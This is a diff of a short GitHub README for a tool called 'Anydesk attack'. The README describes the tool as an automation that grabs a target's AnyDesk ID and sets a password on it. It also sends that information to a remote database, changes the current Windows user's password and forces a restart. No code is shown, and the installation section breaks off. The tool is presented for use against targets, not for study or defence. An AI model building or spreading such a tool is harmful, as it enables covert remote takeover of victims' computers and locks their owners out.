@@ -1,7 +1,10 @@
 ![](https://komarev.com/ghpvc/?username=unrealisticfaces)
 # Anydesk attack
+Anydesk attack is an automation tool used to grab the anydesk id of the target and sets a password to it
 
-###### Make sure to replace the database url and password before exporting it 
+# Features
+- The info will be sent to the database
+- This will also set the password for the current windows user and perform a restart
 
 ### Installation
 ```
